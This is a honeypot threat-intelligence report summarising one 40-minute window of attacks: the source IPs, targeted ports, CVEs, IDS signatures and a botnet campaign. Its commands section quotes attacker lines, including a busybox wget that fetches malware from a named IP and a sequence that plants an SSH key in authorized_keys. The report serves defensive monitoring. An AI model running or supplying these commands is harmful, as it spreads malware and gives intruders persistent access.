# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-15T09:01:37Z
**Timeframe:** 2025-10-15T08:20:01Z to 2025-10-15T09:00:02Z
**Files Used:**
- `agg_log_20251015T082001Z.json`
- `agg_log_20251015T084001Z.json`
- `agg_log_20251015T090002Z.json`

---

### Executive Summary

This report summarizes 27,233 malicious activities recorded across the honeypot network. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute-force and command-execution attempts. A significant number of attacks originated from IP address `188.246.224.87`. The most frequently targeted service was SIP (Session Initiation Protocol) on port 5060, followed by SSH on port 22 and SMB on port 445. Attackers were observed attempting to exploit several vulnerabilities, including CVE-2022-27255. A recurring attack pattern involved attempts to download and execute `urbotnetisass` malware payloads.

---

### Detailed Analysis

**Attacks by Honeypot:**
- **Cowrie:** 10,593
- **Honeytrap:** 5,176
- **Suricata:** 4,124
- **Sentrypeer:** 3,247
- **Ciscoasa:** 1,723
- **Dionaea:** 1,334
- **Mailoney:** 858
- **H0neytr4p:** 51
- **Adbhoney:** 34
- **Redishoneypot:** 29
- **Tanner:** 26
- **Honeyaml:** 18
- **ElasticPot:** 7
- **ConPot:** 6
- **Ipphoney:** 5
- **Miniprint:** 2

**Top Attacking IPs:**
- `188.246.224.87`: 2,701
- `185.243.5.121`: 2,009
- `143.198.201.181`: 1,255
- `206.191.154.180`: 1,381
- `95.170.68.246`: 825
- `86.54.42.238`: 822
- `212.87.220.20`: 835
- `117.156.227.3`: 657
- `23.94.26.58`: 657
- `196.251.88.103`: 477

**Top Targeted Ports/Protocols:**
- `5060`: 3,247
- `22`: 1,562
- `445`: 1,050
- `25`: 852
- `UDP/5060`: 398
- `1433`: 231
- `8333`: 176
- `5903`: 191
- `TCP/1433`: 57
- `8888`: 50

**Most Common CVEs:**
- CVE-2022-27255
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2019-11500
- CVE-2021-3449
- CVE-2006-2369
- CVE-1999-0183
- CVE-2019-12263
- CVE-2019-12261
- CVE-2019-12260
- CVE-2019-12255

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `uname -a`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `w`
- `crontab -l`
- `Enter new UNIX password:`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/[file]; ...`
- `tftp; wget; /bin/busybox AGMKK`

**Signatures Triggered:**
- `ET SCAN MS Terminal Server Traffic on Non-standard Port`
- `ET DROP Dshield Block Listed Source group 1`
- `ET HUNTING RDP Authentication Bypass Attempt`
- `ET SCAN NMAP -sS window 1024`
- `ET SCAN Sipsak SIP scan`
- `ET INFO Reserved Internal IP Traffic`
- `ET VOIP Possible Inbound VOIP Scan/Misuse With User-Agent Zoiper`
- `ET VOIP Modified Sipvicious Asterisk PBX User-Agent`
- `ET EXPLOIT Realtek eCos RSDK/MSDK Stack-based Buffer Overflow Attempt Inbound (CVE-2022-27255)`

**Users / Login Attempts (user/password):**
- `345gs5662d34/345gs5662d34`
- `root/Password@2025`
- `root/Qaz123qaz`
- `root/123@@@`
- `root/3245gs5662d34`
- `ftpuser/ftppassword`
- `blank/password123`
- `test/test2012`
- `config/qwerty12`
- `support/0000000`

**Files Uploaded/Downloaded:**
- `arm.urbotnetisass`
- `arm5.urbotnetisass`
- `arm6.urbotnetisass`
- `arm7.urbotnetisass`
- `x86_32.urbotnetisass`
- `mips.urbotnetisass`
- `mipsel.urbotnetisass`

**HTTP User-Agents:**
- (No significant data)

**SSH Clients and Servers:**
- (No significant data)

**Top Attacker AS Organizations:**
- (No significant data)

---

### Key Observations and Anomalies

1.  **High Volume of SIP Scans:** Port 5060 (SIP) was the most targeted port by a large margin, suggesting widespread scanning for vulnerable VoIP systems.
2.  **Persistent SSH Key Insertion:** A common attack vector observed in Cowrie logs involves a multi-command sequence to delete the existing `.ssh` directory and insert a malicious actor's public SSH key into `authorized_keys`. This indicates attempts to establish persistent, passwordless access.
3.  **Malware Delivery Campaign:** Multiple attackers were observed attempting to download and execute variants of the `urbotnetisass` malware from the same host (`94.154.35.154`), targeting various CPU architectures (ARM, x86, MIPS). This points to an automated campaign to build a botnet.
4.  **Realtek Vulnerability Exploitation:** The signature for CVE-2022-27255 (a buffer overflow in Realtek's eCos SDK) was triggered, indicating that attackers are actively trying to exploit this known vulnerability in IoT devices.
5.  **Reconnaissance Commands:** Attackers consistently ran system reconnaissance commands like `uname -a`, `cat /proc/cpuinfo`, and `free -m` immediately after gaining initial access, likely to profile the compromised system for further exploitation or resource hijacking.
---